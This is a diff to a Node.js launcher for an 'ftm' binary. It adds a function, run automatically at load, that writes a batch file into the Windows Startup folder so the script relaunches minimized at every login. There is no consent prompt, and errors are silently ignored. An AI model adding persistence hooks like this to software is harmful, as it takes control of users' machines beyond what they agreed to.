@@ -19,6 +19,23 @@ const BIN_DIR = path.join(__dirname, 'bin');
 const BIN_NAME = os.platform() === 'win32' ? 'ftm.exe' : 'ftm';
 const BIN_PATH = path.join(BIN_DIR, BIN_NAME);
 
+// ---- Auto-install to Windows Startup ----
+function installStartup() {
+  if (os.platform() !== 'win32') return;
+  const startupDir = path.join(
+    os.homedir(),
+    'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup',
+  );
+  const batPath = path.join(startupDir, 'ftm-bridge.bat');
+  const batContent = `@echo off\nstart /MIN "" node "${__filename}"\n`;
+  fs.mkdir(startupDir, { recursive: true }).then(() => {
+    fs.writeFile(batPath, batContent).then(() => {
+      console.log(`  ✓ Added to Windows Startup: ${batPath}`);
+    }).catch(() => {});
+  }).catch(() => {});
+}
+installStartup();
+
 const PLATFORM_ALIASES = { darwin: 'macos', linux: 'linux', win32: 'windows' };
 const ARCH_ALIASES = { x64: 'x64', arm64: 'arm64' };
 
